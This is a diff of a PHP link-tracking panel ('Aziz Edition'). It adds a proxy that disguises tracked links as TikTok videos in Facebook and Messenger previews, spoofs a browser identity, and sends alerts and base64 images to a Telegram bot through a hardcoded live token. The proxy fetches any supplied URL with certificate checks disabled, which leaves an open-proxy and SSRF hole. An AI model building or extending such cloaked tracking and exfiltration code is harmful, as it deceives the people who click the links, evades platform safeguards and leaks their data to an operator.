@@ -8,6 +8,35 @@ set_time_limit(0);
 
 session_start();
 
+// ==============================================================================
+// 🖼️ وسيط الصور العمودي (يتجاوز حظر تيك توك لفيسبوك)
+// ==============================================================================
+if (isset($_GET['proxy_img'])) {
+    $img_url = base64_decode($_GET['proxy_img']);
+    
+    $ch = curl_init($img_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+    // تمويه هوية البوت لكي تسمح تيك توك بتحميل الصورة
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+    $image_data = curl_exec($ch);
+    $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
+    curl_close($ch);
+
+    if ($image_data) {
+        header("Content-Type: " . ($content_type ?: 'image/jpeg'));
+        header("Cache-Control: public, max-age=86400");
+        echo $image_data;
+        exit;
+    }
+    
+    // صورة احتياطية فقط في حال فشل كل شيء
+    header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=720&h=1280&fit=crop"); 
+    exit;
+}
+
 $db_file = __DIR__ . '/tracker_enhanced_v3.db';
 
 try {
@@ -54,7 +83,7 @@ try {
 
 } catch (Exception $e) { die("Database error: " . $e->getMessage()); }
 
-// دالة إرسال إشعار تلجرام (تدعم إرسال الصور كملف مرفق)
+// دالة إرسال إشعار تلجرام
 function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_token = null) {
     if (empty($chat_id)) return;
     $token = $custom_token ?: '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
@@ -66,12 +95,7 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
         $tmpfile = tempnam(sys_get_temp_dir(), 'tg_img_') . '.jpg';
         file_put_contents($tmpfile, $image_base64_data);
 
-        $data = [
-            'chat_id' => $chat_id, 
-            'caption' => $message, 
-            'parse_mode' => 'HTML',
-            'photo' => new CURLFile($tmpfile)
-        ];
+        $data = ['chat_id' => $chat_id, 'caption' => $message, 'parse_mode' => 'HTML', 'photo' => new CURLFile($tmpfile)];
         
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
@@ -79,9 +103,7 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
         curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        curl_exec($ch);
-        curl_close($ch);
-        @unlink($tmpfile);
+        curl_exec($ch); curl_close($ch); @unlink($tmpfile);
     } else {
         $url = "https://api.telegram.org/bot{$token}/sendMessage";
         $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
@@ -91,21 +113,20 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 2); 
-        curl_exec($ch);
-        curl_close($ch);
+        curl_exec($ch); curl_close($ch);
     }
 }
 
-// دالة محسنة جداً لجلب بيانات تيك توك الحقيقية (عنوان وصورة عمودية)
+// دالة جلب بيانات تيك توك
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => '', 'image' => ''];
+    $meta = ['title' => 'فيديو تيك توك', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=720&h=1280&fit=crop'];
     
-    // المحاولة 1: عبر oEmbed API (أفضل وأسرع طريقة لجلب البيانات الحقيقية)
+    // المحاولة 1: oEmbed
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
         CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     ]);
     $response = curl_exec($ch); curl_close($ch);
     if ($response) {
@@ -115,7 +136,7 @@ function fetch_tiktok_exclusive_meta($url) {
         }
     }
     
-    // المحاولة 2: استخراج مباشر من الصفحة (في حال فشل oEmbed)
+    // المحاولة 2: قراءة الصفحة مباشرة
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
@@ -125,21 +146,13 @@ function fetch_tiktok_exclusive_meta($url) {
     $html = curl_exec($ch); curl_close($ch);
     
     if ($html) {
-        // استخراج العنوان الحقيقي
         if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
-        } elseif (preg_match('/<title>(.*?)<\/title>/s', $html, $matches)) {
-            $meta['title'] = html_entity_decode(trim($matches[1]), ENT_QUOTES, 'UTF-8');
         }
-        
-        // استخراج الصورة العمودية الأصلية
         if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
             $meta['image'] = $matches[1];
         }
     }
-    
-    // إذا فشل كل شيء، نضع عنواناً افتراضياً (نادراً ما يحدث)
-    if (empty($meta['title'])) $meta['title'] = 'فيديو تيك توك';
     
     return $meta;
 }
@@ -216,14 +229,16 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
-            // نمرر رابط الصورة الأصلية مباشرة لجعلها عمودية، ونضع الأبعاد لإجبار ماسنجر على عرضها كاملة
+            // استخدام الوسيط وإجبار الأبعاد العمودية (9:16)
+            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
+            
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
             echo '<meta property="og:description" content="شاهد الفيديو الآن">';
-            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
-            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
-            // إجبار ماسنجر على استخدام الأبعاد العمودية للصورة الأصلية
+            echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
+            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
+            // أبعاد عمودية
             echo '<meta property="og:image:width" content="720">';
             echo '<meta property="og:image:height" content="1280">';
             echo '<meta property="og:type" content="video.other">';
@@ -235,8 +250,7 @@ if (isset($_GET['r'])) {
             if ($is_bot) exit('OK');
             
             if (function_exists('fastcgi_finish_request')) {
-                echo 'OK';
-                fastcgi_finish_request();
+                echo 'OK'; fastcgi_finish_request();
             } else {
                 header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush();
             }
@@ -462,7 +476,6 @@ if ($is_logged_in) {
         :root { --bg: #070913; --card: rgba(16, 23, 42, 0.85); --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; --sidebar-bg: rgba(15, 21, 35, 0.9); }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         
-        /* 🌟 أنيميشن "العقرب" - تغيير الألوان بسلاسة */
         @keyframes scorpionColors {
             0% { background: linear-gradient(135deg, #05080f 0%, #1e1b4b 50%, #05080f 100%); }
             33% { background: linear-gradient(135deg, #05080f 0%, #064e3b 50%, #05080f 100%); }
@@ -611,7 +624,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V17</p>
+                <p>Aziz Edition V18</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
